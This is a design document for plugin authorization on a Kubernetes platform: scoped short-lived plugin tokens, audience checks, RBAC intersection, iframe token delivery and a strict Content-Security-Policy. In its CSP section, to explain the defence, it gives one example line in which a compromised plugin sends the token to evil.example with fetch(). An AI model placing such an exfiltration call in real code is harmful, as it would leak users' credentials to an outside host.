= FUN-17 Plugin Authorization

== Introduction

link:/funs/fun-16[FUN-16] established that plugin UIs run inside sandboxed iframes so that third-party plugin code cannot reach the user's session cookie or the rest of the Console's JavaScript context. That sandbox is the right isolation primitive, but it leaves an open question: how does plugin code inside the sandbox make authenticated API calls? The user's session JWT lives in an `HttpOnly` cookie scoped to the Console origin; the iframe runs on a different origin with `sandbox="allow-scripts"` (no `allow-same-origin`), so even loosening cookie scoping would not help. The plugin literally has no way to read the user's session token.

A second concern surfaces alongside this: even if we *could* hand the user's JWT to the iframe, we shouldn't. The user's JWT carries every organization the user belongs to and every group they're a member of. A cert-manager plugin needs to read Certificate CRs; it does not need permission to delete the organization, manage cluster nodes, or talk to billing endpoints. Giving every plugin the full reach of the user's token violates least-privilege and turns every plugin into a potential confused deputy.

This FUN describes the token model, mint flow, and proxy enforcement that together let plugin code call platform APIs as the user â€” but only inside the scope the plugin's installation manifest declared and the user consented to.

== Two token types

We introduce a second JWT type alongside the existing user session token. Both are HS256-signed with the same secret, but they are distinguished by the JWT `aud` claim. Every service that validates a JWT declares which audiences it accepts.

`UserToken` (`aud=fundament-user`) is the existing session JWT. It is sent over the wire by the browser (cookie), by `functl` (Bearer), or by API-key exchange. It carries the user's identity (`sub`), the set of organizations they belong to (`organization_ids`), display name, and group memberships. Services that accept it: `authn-api`, `organization-api`, `dcim-api`, `kube-api-proxy`, and the rest of the platform's user-facing surface. Services that *reject* it: `plugin-proxy`'s data path (described below).

`PluginToken` (`aud=fundament-plugin`) is new. It represents a user acting *through a specific plugin installation*. It is short-lived (15 minutes, no refresh â€” re-mint instead) and tightly bound to one cluster and one `PluginInstallation` via `installation_id` and `cluster_id` claims. It additionally carries `plugin_name` and `plugin_version` for audit purposes. It does *not* carry an embedded scope â€” the scope lives on the `PluginInstallation` CR and is read by `kube-api-proxy` at validation time (see "Where the scope comes from"). Services that accept it: `kube-api-proxy` and `plugin-proxy`. Services that reject it: every other internal API. Crucially, `authn-api`'s `MintPluginToken` endpoint accepts only `UserToken` â€” a `PluginToken` cannot mint another `PluginToken`. That hard wall keeps the two worlds disjoint.

The `aud` claim is doing real work here. Without it, a plugin holding a PluginToken could replay it against `organization-api/CreateAPIKey` and obtain a long-lived token that bypasses the entire scoping mechanism. With `aud` enforcement, the worst a compromised plugin can do is call the resources its installation permits against the cluster it was scoped to. New requests stop within 15 minutes of revocation; established streams live until the cluster terminates them via the per-user SA's RBAC.

The escalation wall depends on every existing JWT validator enforcing `aud=fundament-user` on UserToken validations. `authn-api`, `organization-api`, `dcim-api`, and `kube-api-proxy` must add this check as a prerequisite rollout â€” it is not a downstream consequence of introducing the new token type.

== Scoping: user intersect plugin

A PluginToken's effective permissions are the intersection of what the user is allowed to do and what the plugin manifest declared. Two enforcement points realize the intersection.

The plugin-scope half is enforced at the proxy. `kube-api-proxy` parses the K8s URL into `(apiGroup, resource, verb, resourceName?)` and matches it against the current scope on the `PluginInstallation` CR (served from a local informer cache, see below). A cert-manager plugin token that lists pods is rejected with 403 before the request reaches the cluster, regardless of who the user is.

The user-permission half is enforced via the existing per-user ServiceAccount token that `kube-api-proxy` injects downstream. That SA token's permissions inside the cluster are exactly the user's project memberships, as today. A request that satisfies the plugin's scope but exceeds the user's project permissions is rejected by the cluster's own RBAC. Namespace-level enforcement lives here: a plugin scope says "read Certificates"; the user's SA decides *in which namespaces*.

The mechanism is deliberately defense-in-depth. Either half failing produces a denial; both halves succeeding produces an allow.

== Where the scope comes from

The plugin's RBAC declaration is part of the `PluginDefinition` manifest. When an organization admin installs a plugin from the marketplace, the install flow copies the declared RBAC into the `PluginInstallation` CR's `spec.permissions.rbac`. This is the *consented* RBAC â€” the rules the admin agreed to grant when accepting the install. If a future plugin version asks for broader RBAC, the upgrade flow surfaces the diff and requires fresh consent before patching the CR. Wildcards (`"*"`) are permitted in the manifest; consent surface for them is owned by the install flow (link:/funs/fun-11[FUN-11]). The spec field, not the running pod, is the source of truth.

The scope mirrors Kubernetes `PolicyRule`:

[source,json]
----
"rbac": [
  {
    "apiGroups": ["cert-manager.io"],
    "resources": ["certificates", "certificaterequests"],
    "verbs": ["get", "list", "watch"]
  },
  {
    "apiGroups": [""],
    "resources": ["secrets"],
    "verbs": ["get"],
    "resourceNames": ["cert-manager-webhook-ca"]
  }
]
----

`kube-api-proxy` matches the parsed request `(apiGroup, resource, verb, resourceName?)` against each entry: a rule allows when `apiGroup âˆˆ apiGroups`, `resource âˆˆ resources`, `verb âˆˆ verbs`, and (if `resourceNames` is present and the request targets a specific name) `resourceName âˆˆ resourceNames`. `"*"` is a wildcard. Subresources are expressed as `pods/log`. Collection verbs (`list`, `watch`) bypass `resourceNames` matching, consistent with K8s RBAC.

Namespace constraints are deliberately *not* part of the scope. The cluster's own RBAC on the user's per-user SA â€” driven by project membership â€” restricts which namespaces are reachable. The plugin scope answers "is this resource type in the plugin's contract?"; the user's RBAC answers "where?".

When `authn-api` mints a PluginToken, it asks `plugin-proxy` whether the installation exists and gets back `{plugin_name, plugin_version, organization_id, status}` â€” no rbac. The PluginToken is signed with that identity and the binding (cluster, installation). `kube-api-proxy` reads the live scope from its local `PluginInstallation` informer cache at every request. The token is a bound *capability*, not a scope snapshot.

Putting the scope on the CR â€” and reading it live at validation time, rather than embedding it in the JWT â€” keeps consent state and runtime state in the same place and avoids two pitfalls: tokens unbounded in size as plugins grow more rules, and a stale-snapshot window between admin re-consent and propagation.

== Delivering the token

The Console is the primary party that mints PluginTokens for iframe delivery â€” it has the user's cookie. `functl` and the Terraform provider can also mint PluginTokens against `authn-api` using their existing `UserToken` (Bearer or API-key-exchanged), which lets CLI and IaC workflows drive plugin-scoped resources under the same scope-intersection rules. A concrete forward direction: plugins ship Terraform providers that authenticate via injected PluginTokens, letting IaC describe plugin-managed resources with the same scope discipline as the iframe path. The iframe case is the one that needs special plumbing: the iframe is the only party that needs to *use* the token but cannot mint it itself. We bridge Console and iframe with a `postMessage` handshake that extends the existing `fundament:init` / `plugin:ready` protocol.

When the Console mounts an iframe, it kicks off a `MintPluginToken` request in parallel with the browser fetching the iframe's `index.html`. When `plugin:ready` arrives from the SDK, the Console awaits the mint and then sends `fundament:init` carrying `{protocol_version: 1, token, theme, ...context}`. Before 80% of the TTL elapses, the Console mints a fresh token and pushes it via `fundament:token-refreshed`. The SDK exposes `fundament.getToken()` â€” plugins call it whenever they need a Bearer value â€” and `fundament.fetch()`, a helper that attaches the token and retries once on 401 (to ride out a refresh-vs-call race).

The Console holds tokens only in a JS variable on the parent window. They are never written to `localStorage`, `sessionStorage`, `IndexedDB`, or any other persistent storage. Closing the tab discards them.

Every host-to-iframe `postMessage` call pins the *target origin* to `plugin-proxy`'s origin. The legacy `postMessage(msg, '*')` form is safe against other windows but unsafe if the iframe is ever navigated off its expected origin â€” at that point, an attacker page would silently receive every subsequent message including the next refreshed token. Pinning the target origin lets the browser refuse delivery on mismatch. The cost is zero because we always know the origin: we constructed the iframe `src` ourselves.

== The CSP is load-bearing

Sandboxing isolates the iframe from the parent. It does not, on its own, stop the iframe from making outbound network calls to anywhere on the internet. A malicious or compromised plugin holding a PluginToken could `fetch('https://evil.example/exfil', { headers: { Authorization: ... } })` in milliseconds. Sandboxing alone is not enough â€” we need the browser to refuse the outbound call.

`plugin-proxy` decorates every `/plugins/{name}/{version}/console/*` response with a strict Content-Security-Policy:

[source,text]
----
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src  'self';
  connect-src https://kube-api-proxy.fundament.io
              https://plugin-proxy.fundament.io;
  form-action https://kube-api-proxy.fundament.io
              https://plugin-proxy.fundament.io;
  frame-ancestors https://console.fundament.io;
  base-uri 'none';
  object-src 'none';
----

The `connect-src` allowlist is the line that does the work. The plugin's JS can `fetch()` only the two proxies â€” every other destination is refused by the browser before the request leaves the iframe. `form-action` closes the parallel exfil path via `<form>` submission, which `connect-src` does not cover, while still allowing legitimate POSTs (file uploads, cert submissions) to the proxies. `frame-ancestors` ensures nobody but the Console can host the iframe in the first place. The plugin author cannot override this policy because it is a response header set by `plugin-proxy`, outside the plugin's HTML.

`script-src 'self'` and `style-src 'self'` allow scripts and styles only from the plugin's own origin â€” no inline content, no remote sources. Since the iframe now holds a usable PluginToken, the SDK is no longer the exfil chokepoint it was when the parent mediated every API call; the CSP is. `'unsafe-inline'` would defeat that, so this design rules it out from v1. The SDK is shipped as a separate file at `/plugins/sdk/{version}/sdk.js`, loaded via a normal `<script src="â€¦">` reference from the plugin's HTML, and plugin authors follow the same pattern for their own code â€” scripts in separate files, no inline `<script>` blocks or `on*` attribute handlers. Modern SPA build tools default to this layout. If a future use case genuinely requires inline content (e.g., server-injected bootstrap config), nonces can be added per-response, but no such case exists in v1.

`plugin-proxy` reserves `/csp-reports` for future CSP `report-to` / `Reporting-Endpoints` integration so violations become observable; not wired in v1.

== Streaming connections

Long-running streams â€” watches, `exec`, `attach`, log tails, port-forwards â€” are authorized at request start and then live until naturally disconnected. The 15-minute TTL governs when *new* authorization decisions get re-evaluated; it does not kill in-flight streams. Revocation of an in-flight stream remains the cluster's responsibility: the per-user ServiceAccount loses its RoleBindings when the user loses project access, and the cluster terminates the stream from that side.

Watches additionally benefit from proactive reconnection: the SDK re-establishes the connection near the TTL boundary with a fresh token and the last-observed `resourceVersion`, so plugin code sees an uninterrupted event stream and avoids an unexpected drop later when the underlying connection dies for unrelated reasons.

Non-resumable streams (`exec`, log tails, port-forwards) cannot replay missed bytes; if the cluster terminates them mid-flight, the SDK surfaces a disconnect and the plugin must re-establish.

== Threat model

A few classes of compromise are worth walking through explicitly.

*Compromised plugin code.* This is the marquee case. The plugin sees its PluginToken â€” that's by design â€” but it cannot:

- Replay it against `authn-api`, `organization-api`, `dcim-api`, or any other internal API (`aud` mismatch â†’ 401).
- Use it for a different installation or a different cluster (claim binding â†’ 403).
- Use it to mint another PluginToken (escalation wall).
- Use it to acquire broader permissions than the current `PluginInstallation` CR permits â€” scope lookup is dynamic, the token is just a bound capability.
- Exfiltrate it to `evil.example` (CSP `connect-src` and `form-action` denial).

Within those bounds, a compromised plugin can read and write exactly the resources its installation manifest declares, exactly as the user could have done themselves. That is the irreducible blast radius â€” a plugin you installed cannot do less than what you let it do.

*Compromised Console JS (XSS).* A successful XSS on the Console origin can call `MintPluginToken` directly using the user's cookie, so it can mint plugin tokens. But this is strictly weaker than the cookie itself, which an XSS on Console origin already controls. The plugin authorization model neither helps nor hurts this case; it relies on the Console's existing XSS hygiene.

*JWT-secret compromise.* Both token types are HS256-signed with a secret held by every JWT-validating service. Compromise of any such service lets an attacker forge tokens. For PluginTokens this is bounded by the scope of some real `PluginInstallation` (the attacker cannot invent new permissions, only impersonate existing ones), but it remains a real risk surface. A planned hardening â€” splitting `authn-api` as sole holder of an asymmetric signing key, with public-key validation everywhere else â€” closes the forge path entirely. Out of scope for v1; tracked as future work.

*Network interception.* Tokens travel only in TLS-protected channels and only in `Authorization` headers (never in URLs, where they would leak via Referer headers and browser history). Existing TLS posture covers this.

*Postmessage delivery to a wrong-origin page.* Pinned target origin in every hostâ†’iframe `postMessage` call. The browser refuses delivery if the iframe was navigated off its expected origin.

== Lifecycle

We rely on short TTL plus mint-time gating rather than a deny-list. Each refresh re-runs the gate:

- The user logs out â†’ cookie cleared â†’ next mint has no `UserToken` â†’ 401 â†’ host emits `fundament:auth-failed`. Live tokens expire on their own within 15 minutes.
- The user loses cluster access (removed from org or project) â†’ OpenFGA `can_view` returns false on the next mint â†’ 403. In-flight streams die when the user's SA loses its cluster RoleBindings.
- The plugin is uninstalled â†’ `GetInstallationManifest` returns `NotFound`, or `FailedPrecondition` if the CR carries a non-zero `metadata.deletionTimestamp` â†’ next mint fails. The runtime pod is being torn down regardless.
- The plugin scope changes (admin re-consents during an upgrade) â†’ CR `spec.permissions.rbac` is patched â†’ `kube-api-proxy`'s informer picks up the update within seconds â†’ next request is matched against the new scope. Narrowing and widening propagate symmetrically through the informer; the only asymmetry is that new permissions require re-consent before they can apply.
- `JWT_SECRET` rotates â†’ every token (both types) is invalidated, same as today.

If a future incident demands sub-TTL revocation (e.g. a known-bad plugin must be killed *now*), we can layer a deny-list keyed by `installation_id` checked at proxy validation time. That stays out of scope for v1.

== Architecture

Two pieces of net-new infrastructure, plus modest changes to existing services.

`authn-api` gains a `TokenService.MintPluginToken` Connect RPC. It validates the caller's `UserToken` (including `aud=fundament-user`), checks OpenFGA for cluster-view authorization, asks `plugin-proxy` for installation existence and identity, and signs the PluginToken with identity + binding claims (no scope). The `can_view` and installation-existence results are cached per `(user, cluster, installation_id)` for ~30 seconds to keep the mint path fast under iframe-mount load.

`plugin-proxy` is a new service alongside `kube-api-proxy`. It carries two distinct surfaces:

- *Internal:* a single `PluginInstallationService.GetInstallationManifest` RPC returning `{plugin_name, plugin_version, organization_id, status}`. Bound to a cluster-internal Service and restricted by NetworkPolicy to `authn-api`'s ServiceAccount.
- *Public:* static asset serving at `/plugins/{name}/{version}/console/*` (CSP-decorated, no auth, long cache), and authenticated proxying at `/installations/{id}/runtime/*` (plugin pod) and `/installations/{id}/controller/*` (plugin-controller status). The authenticated routes require a PluginToken whose `installation_id` matches the URL.

`kube-api-proxy` learns to accept both token types. For PluginToken requests it adds three gates: `aud=fundament-plugin`, `cluster_id` in the URL must equal `claims.cluster_id`, and the parsed `(apiGroup, resource, verb, resourceName?)` of the K8s request must match a rule in the current `PluginInstallation` CR scope. The scope is served from a local `PluginInstallation` informer keyed by `(cluster, installation_id)`; informer updates propagate scope changes within seconds. The per-user ServiceAccount injection is unchanged â€” the plugin still acts as the user inside the cluster, and in-cluster audit continues to show the user as the actor.

For PluginToken requests, the proxy additionally emits a structured stdout audit line tagged with the user, installation, plugin name, and version, so forensic queries can attribute cluster mutations to a specific plugin installation â€” the cluster's own audit log shows only the per-user SA.

`console-frontend` mints the token via Connect, holds it in JS memory (never persistent storage), schedules refresh, and delivers it to the iframe via `postMessage` with pinned target origin. The Plugin SDK exposes `fundament.getToken()` and `fundament.fetch()` so plugin authors do not deal with token handling directly.

The `PluginInstallation` CRD gains `spec.permissions.rbac` to carry the consented scope. The CRD update is part of link:/funs/fun-11[FUN-11]'s schema and must land alongside this FUN.

== Alternatives considered

*Hand the UserToken to the iframe.* Rejected primarily because of the blast radius: the UserToken's reach across every organization and group the user belongs to makes it unacceptable to hand to plugin code regardless of delivery mechanism. The technical delivery problem (HttpOnly cookie, opaque iframe origin) is independently a blocker but secondary.

*Embed the scope in the JWT claim.* Initial draft. Rejected because (a) JWT size grows with rule count, hitting common proxy header limits (~8KB) for plugins with extensive RBAC; (b) the embedded snapshot diverges from the live CR after admin re-consent, creating a stale-permissions window until the token expires; (c) reading scope from the CR at validation time consolidates the source of truth â€” the CR remains authoritative, the token is just a bound capability.

*A Backend-for-Frontend that proxies every plugin API call through the Console.* Plugin iframe `postMessage`s every request to the parent, which then makes the real call with its cookie. The Console would enforce what the plugin is allowed to call. Rejected because it couples the plugin tightly to the parent's message bus, breaks every existing K8s client library (which expects to talk to an HTTP endpoint), and pushes a stream of postMessages through a single-threaded JS context for every list/watch.

*Signed one-time URLs for asset loads.* Console asks the backend for a signed URL for `index.html` and uses it as the iframe `src`. Rejected because the assets are not secret â€” they are SPA bundles. The complexity of signing every sub-resource URL (or maintaining a session cookie for the iframe's plugin-proxy origin) buys nothing the CSP-on-public-assets approach doesn't already deliver.

*Plugin-specific ServiceAccount in the cluster.* Give each plugin its own SA and use it for the plugin's data calls. Rejected because in-cluster RBAC would have to be the union of every user-allowed verb for every user, which is more permissive than any single user. It would also obscure auditing â€” every plugin call would show up as a generic plugin SA rather than as the user the plugin acted on behalf of.

*A policy engine (OPA / Cedar / etc.) for plugin scope.* Rejected as the wrong shape: a plain structural match against `PolicyRule`-style entries fits the K8s mental model exactly, doesn't require a second policy language, and avoids the operational surface of a separate engine. OpenFGA stays as the relationship-based authorization (link:/funs/fun-7[FUN-7]); plugin scope is a straightforward subset of Kubernetes RBAC matching.
